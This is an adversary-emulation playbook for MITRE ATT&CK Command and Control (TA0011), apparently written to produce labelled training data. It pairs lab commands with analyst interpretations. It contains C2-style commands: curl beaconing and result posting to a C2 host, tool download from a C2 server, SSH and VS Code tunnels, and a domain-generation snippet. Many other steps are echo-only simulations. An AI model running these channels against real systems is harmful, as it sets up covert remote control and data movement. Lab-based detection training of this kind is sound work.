# Command and Control Enumeration Playbook (ATT&CK TA0011, Dataset-Ready)

> Purpose: provide realistic, high-value C2 training data with commands, tool outputs, and analyst interpretation.
> Scope: authorized lab and sanctioned exercises only.

Command and Control covers adversary methods for maintaining communication with compromised systems while blending into expected traffic.

- ATT&CK Tactic ID: TA0011
- Created: 17 October 2018
- Last Modified: 25 April 2025
- Techniques in scope: T1071, T1092, T1659, T1132, T1001, T1568, T1573, T1008, T1665, T1105, T1104, T1095, T1571, T1572, T1090, T1219, T1205, T1102

---

## 0. Safety and Lab Controls

1. Execute only in approved lab environments and sinkholed infrastructure.
2. Use benign payload markers (`ta0011_*`) instead of malware.
3. Restrict outbound traffic to test domains and controlled C2 listeners.
4. Keep packet captures and endpoint logs for each communication phase.
5. Tear down listeners, tunnels, and proxy chains after each run.

### 0.1 Evidence Wrapper

```bash
mkdir -p evidence

run_c2() {
  local technique="$1"
  local label="$2"
  shift 2
  local ts
  ts="$(date -u +%Y%m%dT%H%M%SZ)"
  echo "[$ts] [$technique] $label" | tee -a evidence/c2.log
  "$@" 2>&1 | tee "evidence/${ts}_${technique}_${label}.txt"
}
```

### 0.2 Training Record Schema

```json
{
  "technique": "T1071.004",
  "technique_name": "DNS",
  "scenario": "Agent sends beacon markers via controlled DNS queries",
  "command": "dig +short ta0011-beacon-01.c2.lab.local",
  "tool_result": {"status":"success", "highlights":["TXT response returned task id"]},
  "analyst_interpretation": "DNS traffic may be carrying command signaling",
  "confidence": 0.95,
  "mitigation_hint": "Alert on high-entropy subdomains and atypical query patterns"
}
```

---

## 1. Baseline Before C2 Simulation

Scenario:
- Record current network identity and egress profile before C2 channel testing.

```bash
run_c2 "TA0011" "baseline_identity" sh -lc 'whoami; hostname; date -u'
run_c2 "TA0011" "baseline_egress" sh -lc 'ip route; ss -tunap | head -n 30'
```

Example result:

```text
corp\labuser
C2-TEST-01
2026-04-21T17:10:09Z
default via 10.20.30.1 dev eth0
```

---

## 2. T1071 Application Layer Protocol

Scenario:
- C2 traffic is embedded in common application protocols to blend with legitimate traffic.

### T1071.001 Web Protocols

```bash
run_c2 "T1071.001" "https_beacon" curl -k -s -H "User-Agent: Mozilla/5.0" "https://c2.lab.local/task?id=ta0011-01"
run_c2 "T1071.001" "https_post_result" curl -k -s -X POST "https://c2.lab.local/result" -d "host=C2-TEST-01&status=ok"
```

### T1071.002 File Transfer Protocols

```bash
run_c2 "T1071.002" "ftp_control_channel" sh -lc 'printf "open 10.20.40.9\nuser test test\nput /tmp/ta0011.txt\nbye\n" | ftp -inv'
```

### T1071.003 Mail Protocols

```bash
run_c2 "T1071.003" "smtp_signal" swaks --server 10.20.40.25 --from ops@lab.local --to agent@lab.local --header "Subject: ta0011 task" --body "run:whoami"
```

### T1071.004 DNS

```bash
run_c2 "T1071.004" "dns_beacon" dig +short ta0011-beacon-01.c2.lab.local
run_c2 "T1071.004" "dns_txt_task" dig +short TXT task01.c2.lab.local
```

### T1071.005 Publish/Subscribe Protocols

```bash
run_c2 "T1071.005" "mqtt_sub" mosquitto_sub -h 10.20.40.30 -t lab/c2/task -C 1
run_c2 "T1071.005" "mqtt_pub" mosquitto_pub -h 10.20.40.30 -t lab/c2/result -m "ta0011_ok"
```

Example result:

```text
"task=collect:/tmp/stage"
ta0011_ok
```

---

## 3. Encoding, Obfuscation, and Encryption

## T1132 Data Encoding

### T1132.001 Standard Encoding

```bash
run_c2 "T1132.001" "base64_encode" sh -lc 'echo -n "cmd:hostname" | base64'
run_c2 "T1132.001" "gzip_encode" sh -lc 'echo "ta0011_payload" | gzip -c | base64'
```

### T1132.002 Non-Standard Encoding

```bash
run_c2 "T1132.002" "custom_b64_sim" python3 - <<'PY'
import base64
s = base64.b64encode(b'ta0011_cmd').decode().replace('+','-').replace('/','_').replace('=','.')
print(s)
PY
```

## T1001 Data Obfuscation

### T1001.001 Junk Data

```bash
run_c2 "T1001.001" "junk_padding" sh -lc 'echo "AAAAAJUNKJUNKcmd=whoamiJUNKJUNKBBBBB"'
```

### T1001.002 Steganography

```bash
run_c2 "T1001.002" "stego_embed_sim" sh -lc 'echo "simulate hidden command data inside PNG metadata in lab"'
```

### T1001.003 Protocol or Service Impersonation

```bash
run_c2 "T1001.003" "service_impersonation" curl -s -H "User-Agent: Microsoft-CryptoAPI/10.0" https://updates.lab.local/check
```

## T1573 Encrypted Channel

### T1573.001 Symmetric Cryptography

```bash
run_c2 "T1573.001" "aes_encrypt" sh -lc 'echo "c2_task" | openssl enc -aes-256-cbc -pbkdf2 -pass pass:TrainingOnly! -base64'
```

### T1573.002 Asymmetric Cryptography

```bash
run_c2 "T1573.002" "rsa_encrypt" sh -lc 'echo "c2_result" > /tmp/c2_result.txt; openssl rsautl -encrypt -pubin -inkey /tmp/lab_pub.pem -in /tmp/c2_result.txt -out /tmp/c2_result.enc'
```

---

## 4. Dynamic Resolution and Channel Resilience

## T1568 Dynamic Resolution

### T1568.001 Fast Flux DNS

```bash
run_c2 "T1568.001" "fast_flux_lookup" sh -lc 'for i in 1 2 3; do dig +short flux.c2.lab.local; sleep 2; done'
```

### T1568.002 Domain Generation Algorithms

```bash
run_c2 "T1568.002" "dga_sim" python3 - <<'PY'
import datetime, hashlib
seed = datetime.date.today().isoformat()
for i in range(5):
    d = hashlib.md5(f"{seed}-{i}".encode()).hexdigest()[:12]
    print(d + '.lab')
PY
```

### T1568.003 DNS Calculation

```bash
run_c2 "T1568.003" "dns_calc_sim" python3 - <<'PY'
import ipaddress
ip = ipaddress.ip_address('10.20.40.9')
print('derived_port=', (int(ip) % 40000) + 1024)
PY
```

## T1008 Fallback Channels

```bash
run_c2 "T1008" "fallback_logic" sh -lc 'echo "primary=https; fallback=dns; tertiary=mqtt"'
```

## T1104 Multi-Stage Channels

```bash
run_c2 "T1104" "multi_stage_sim" sh -lc 'echo "stage1 resolver -> stage2 loader -> stage3 interactive channel"'
```

## T1665 Hide Infrastructure

```bash
run_c2 "T1665" "infra_hiding_sim" sh -lc 'echo "simulate infrastructure filtering, sink checks, and masked C2 endpoints"'
```

---

## 5. Transport and Routing Variants

## T1095 Non-Application Layer Protocol

```bash
run_c2 "T1095" "icmp_channel_sim" ping -c 2 -p 746130303131 10.20.40.9
```

## T1571 Non-Standard Port

```bash
run_c2 "T1571" "https_nonstandard_port" curl -k -s https://10.20.40.9:8443/task
```

## T1572 Protocol Tunneling

```bash
run_c2 "T1572" "ssh_tunnel" ssh -N -L 8443:10.20.40.9:443 lab@10.20.40.20
```

## T1090 Proxy

### T1090.001 Internal Proxy

```bash
run_c2 "T1090.001" "internal_proxy_sim" sh -lc 'echo "simulate pivot host relaying C2 over SMB/HTTP internally"'
```

### T1090.002 External Proxy

```bash
run_c2 "T1090.002" "external_proxy" curl -x http://proxy.lab.local:8080 -s https://c2.lab.local/ping
```

### T1090.003 Multi-hop Proxy

```bash
run_c2 "T1090.003" "multihop_proxy_sim" sh -lc 'echo "simulate chained proxy route: host -> proxy1 -> proxy2 -> c2"'
```

### T1090.004 Domain Fronting

```bash
run_c2 "T1090.004" "domain_fronting_sim" sh -lc 'echo "simulate mismatched TLS SNI and HTTP Host in controlled CDN lab"'
```

---

## 6. Remote Access Tooling and Traffic Signaling

## T1219 Remote Access Tools

### T1219.001 IDE Tunneling

```bash
run_c2 "T1219.001" "ide_tunnel" code tunnel --accept-server-license-terms
```

### T1219.002 Remote Desktop Software

```bash
run_c2 "T1219.002" "remote_desktop_tool_sim" sh -lc 'echo "simulate AnyDesk/TeamViewer session establishment in lab"'
```

### T1219.003 Remote Access Hardware

```bash
run_c2 "T1219.003" "kvm_hardware_sim" sh -lc 'echo "simulate PiKVM/TinyPilot remote management channel"'
```

## T1205 Traffic Signaling

### T1205.001 Port Knocking

```bash
run_c2 "T1205.001" "port_knock" knock 10.20.40.9 1111 2222 3333
```

### T1205.002 Socket Filters

```bash
run_c2 "T1205.002" "socket_filter_sim" sh -lc 'echo "simulate libpcap filter-triggered backdoor activation"'
```

---

## 7. Tool Delivery, Media Relay, Injection, and Web Services

## T1105 Ingress Tool Transfer

```bash
run_c2 "T1105" "ingress_http" curl -k -o /tmp/tool.bin https://c2.lab.local/bin/tool.bin
run_c2 "T1105" "ingress_ftp" sh -lc 'printf "open 10.20.40.9\nuser test test\nget tool.bin /tmp/tool.bin\nbye\n" | ftp -inv'
```

## T1092 Communication Through Removable Media

```bash
run_c2 "T1092" "removable_media_relay_sim" sh -lc 'echo "simulate command file transfer between connected and disconnected hosts via USB media"'
```

## T1659 Content Injection

```bash
run_c2 "T1659" "content_injection_sim" sh -lc 'echo "simulate malicious script injection into trusted web response path"'
```

## T1102 Web Service

### T1102.001 Dead Drop Resolver

```bash
run_c2 "T1102.001" "dead_drop_resolver" sh -lc 'echo "simulate reading C2 endpoint pointer from public paste/document service"'
```

### T1102.002 Bidirectional Communication

```bash
run_c2 "T1102.002" "bidirectional_web_service_sim" sh -lc 'echo "simulate pull command + push result using shared web service API"'
```

### T1102.003 One-Way Communication

```bash
run_c2 "T1102.003" "oneway_web_service_sim" sh -lc 'echo "simulate one-way tasking channel without response"'
```

---

## 8. Label-Ready Examples (JSONL)

```json
{"technique":"T1071.004","command":"dig TXT task01.c2.lab.local","result":"TXT task returned","interpretation":"DNS channel may carry C2 instructions"}
{"technique":"T1132.001","command":"echo cmd | base64","result":"Encoded payload string produced","interpretation":"Standard encoding used to reduce content visibility"}
{"technique":"T1573.001","command":"openssl enc -aes-256-cbc ...","result":"Ciphertext generated","interpretation":"Symmetric encryption applied to C2 payload"}
{"technique":"T1090.002","command":"curl -x proxy ...","result":"Request reached C2 via proxy","interpretation":"External proxy masks direct infrastructure contact"}
{"technique":"T1205.001","command":"knock host 1111 2222 3333","result":"Hidden service port opened in lab","interpretation":"Traffic signaling used to gate C2 channel"}
```

---

## 9. Coverage Checklist

- TA0011 Command and Control
- T1071 Application Layer Protocol
- T1071.001 Web Protocols
- T1071.002 File Transfer Protocols
- T1071.003 Mail Protocols
- T1071.004 DNS
- T1071.005 Publish/Subscribe Protocols
- T1092 Communication Through Removable Media
- T1659 Content Injection
- T1132 Data Encoding
- T1132.001 Standard Encoding
- T1132.002 Non-Standard Encoding
- T1001 Data Obfuscation
- T1001.001 Junk Data
- T1001.002 Steganography
- T1001.003 Protocol or Service Impersonation
- T1568 Dynamic Resolution
- T1568.001 Fast Flux DNS
- T1568.002 Domain Generation Algorithms
- T1568.003 DNS Calculation
- T1573 Encrypted Channel
- T1573.001 Symmetric Cryptography
- T1573.002 Asymmetric Cryptography
- T1008 Fallback Channels
- T1665 Hide Infrastructure
- T1105 Ingress Tool Transfer
- T1104 Multi-Stage Channels
- T1095 Non-Application Layer Protocol
- T1571 Non-Standard Port
- T1572 Protocol Tunneling
- T1090 Proxy
- T1090.001 Internal Proxy
- T1090.002 External Proxy
- T1090.003 Multi-hop Proxy
- T1090.004 Domain Fronting
- T1219 Remote Access Tools
- T1219.001 IDE Tunneling
- T1219.002 Remote Desktop Software
- T1219.003 Remote Access Hardware
- T1205 Traffic Signaling
- T1205.001 Port Knocking
- T1205.002 Socket Filters
- T1102 Web Service
- T1102.001 Dead Drop Resolver
- T1102.002 Bidirectional Communication
- T1102.003 One-Way Communication

This document is optimized for training corpus generation: scenario + command + output + interpretation + mitigation cues.
